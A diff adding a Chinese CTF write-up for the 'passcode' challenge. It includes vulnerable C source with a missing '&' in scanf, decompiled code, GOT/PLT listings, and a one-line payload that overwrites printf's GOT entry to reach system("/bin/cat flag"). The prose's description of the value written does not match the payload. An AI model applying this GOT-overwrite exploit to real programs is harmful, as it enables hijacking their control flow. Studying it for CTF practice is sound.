@@ -55,4 +55,173 @@ atoi不能转化16进制数, 所以我们手动转换0x1234, 它的十进制表�
 ## 2 collision
 
 
+## 5 passcode
+```c
+#include <stdio.h>
+
+#include <stdlib.h>
+
+  
+
+void login(){
+
+        int passcode1;
+
+        int passcode2;
+
+  
+
+        printf("enter passcode1 : ");
+
+        scanf("%d", passcode1);
+
+        fflush(stdin);
+
+  
+
+        // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
+
+        printf("enter passcode2 : ");
+
+        scanf("%d", passcode2);
+
+  
+
+        printf("checking...\n");
+
+        if(passcode1==338150 && passcode2==13371337){
+
+                printf("Login OK!\n");
+
+                system("/bin/cat flag");
+
+        }
+
+        else{
+
+                printf("Login Failed!\n");
+
+                exit(0);
+
+        }
+
+}
+
+  
+
+void welcome(){
+
+        char name[100];
+
+        printf("enter you name : ");
+
+        scanf("%100s", name);
+
+        printf("Welcome %s!\n", name);
+
+}
+
+  
+
+int main(){
+
+        printf("Toddler's Secure Login System 1.0 beta.\n");
+
+  
+
+        welcome();
+
+        login();
+
+  
+
+        // something after login...
+
+        printf("Now I can safely trust you that you have credential :)\n");
+
+        return 0;
+
+}
+```
+容易注意到login函数中这句 
+```c
+scanf("%d", passcode1);
+```
+本应该为
+```c
+scanf("%d", &passcode1);
+```
+也就是说scanf本该向passcode1所在地址写入内容, 却变成了将passcode1中存入的数作为地址, 向其写入内容. 这给了我们可乘之机, 如果能够覆盖passcode1的内容, 就可以向这个地址写入内容. 
+那么如何修改passcode1呢? 自然我们要看在其之前执行的welcome函数, 它读入了100个字符. 
+用IDA反编译一下 
+```c
+int login()
+{
+  int v1; // [esp+18h] [ebp-10h]
+  int v2; // [esp+1Ch] [ebp-Ch]
+
+  printf("enter passcode1 : ");
+  __isoc99_scanf("%d", v1);
+  fflush(stdin);
+  printf("enter passcode2 : ");
+  __isoc99_scanf("%d", v2);
+  puts("checking...");
+  if ( v1 != 338150 || v2 != 13371337 )
+  {
+    puts("Login Failed!");
+    exit(0);
+  }
+  puts("Login OK!");
+  return system("/bin/cat flag");
+}
+
+unsigned int welcome()
+{
+  char v1[100]; // [esp+18h] [ebp-70h] BYREF
+  unsigned int v2; // [esp+7Ch] [ebp-Ch]
+
+  v2 = __readgsdword(0x14u);
+  printf("enter you name : ");
+  __isoc99_scanf("%100s", v1);
+  printf("Welcome %s!\n", v1);
+  return __readgsdword(0x14u) ^ v2;
+}
+```
+由于welcome和login紧挨着先后执行, 那么代表栈底的ebp应该没有改变. login中的v1即passcode1在ebp-10h的位置, welcome中的v1即name在ebp-70h的位置, 70h-10h = 60h = 96. 也就是他们位置相差96字节, 而我们可以输入100个字节, 这多出的4个字节就正好可以覆盖passcode1. 如果把passcode1覆盖成printf函数的GOT,再在scanf向passcode1内的地址, 即我们覆盖的printf的GOT写入时输入system的GOT, 就可以将即将执行的printf变成system("/bin/cat flag")这个指令了.
+在IDA里找到他们: 
+```text
+.plt:08048420
+.plt:08048420 ; =============== S U B R O U T I N E =======================================
+.plt:08048420
+.plt:08048420 ; Attributes: thunk
+.plt:08048420
+.plt:08048420 ; int printf(const char *format, ...)
+.plt:08048420 _printf         proc near               ; CODE XREF: login+E↓p
+.plt:08048420                                         ; login+3C↓p ...
+.plt:08048420
+.plt:08048420 format          = dword ptr  4
+.plt:08048420
+.plt:08048420                 jmp     ds:off_804A000
+.plt:08048420 _printf         endp
+.plt:08048420
+```
+```text
+.plt:08048460 ; =============== S U B R O U T I N E =======================================
+.plt:08048460
+.plt:08048460 ; Attributes: thunk
+.plt:08048460
+.plt:08048460 ; int system(const char *command)
+.plt:08048460 _system         proc near               ; CODE XREF: login+86↓p
+.plt:08048460
+.plt:08048460 command         = dword ptr  4
+.plt:08048460
+.plt:08048460                 jmp     ds:off_804A010
+.plt:08048460 _system         endp
+.plt:08048460
+```
+### 实现:
+```python
+python -c 'print "A"*96+"\x00\xa0\x04\x08"+"134514147\n"' | ./passcode
+
+```
 
